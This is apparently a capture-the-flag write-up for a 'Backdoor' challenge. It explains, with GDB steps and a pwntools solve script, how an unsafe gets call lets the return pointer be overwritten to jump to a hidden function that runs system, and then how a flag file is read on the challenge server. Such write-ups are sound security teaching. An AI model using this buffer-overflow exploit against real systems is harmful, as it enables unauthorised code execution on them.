# Backdoor
Solves: 5

## Description
Someone told me that this program contains a backdoor, but I can't seem to find out how to trigger it... Can you maybe help me?
```
nc backdoor.heltsikker.no 9002
```

## Solution
Looking at `objdump -D -M intel` there are two interesting things to note:
 -  The function named `backdoor` at address `0x08049236` that calls `system`
 -  The insecure use of `gets` in `welcome`

So the action plan then is:
 - Use `gets` to overwrite the return pointer in `welcome`
 - Set the return pointer to the address of `backdoor`
 - Profit!

To do this we need to know at which offset from the start of the array `gets` reads into the return pointer is located, one way to find this is using GDB and the pwntools function `cyclic`:
 - Fire up GDB
 - Set a breakpoint right after the call to `gets`
    - `disass welcome`
    - `b *0x08049299`
 - Run the program with the cyclic input piped to the program
    - `r < <(pwn cyclic)`
 - Read the return pointer
    - `info frame`
    - Which gives `eip = 0x6161616c`

With pwntools the offset can now be found with `cyclic_find(0x6161616c)` which gives an offset of 48. The payload then is 48 bytes of padding and then the address of `backdoor`, this can easily be accomplished with the `fit` and `p32` functions in pwntools and gives the solve script:
```python
from pwn import *
r = remote("backdoor.heltsikker.no", 9002)
r.sendline(fit({cyclic_find(0x6161616c) : p32(0x08049236)}))
r.sendline("cat flag.txt")
print(r.recvline_startswith("HSCTF").decode("UTF-8"))
```

And that gives the flag:
```
HSCTF{if_only_every_shell_was_this_easy_to_pop}
```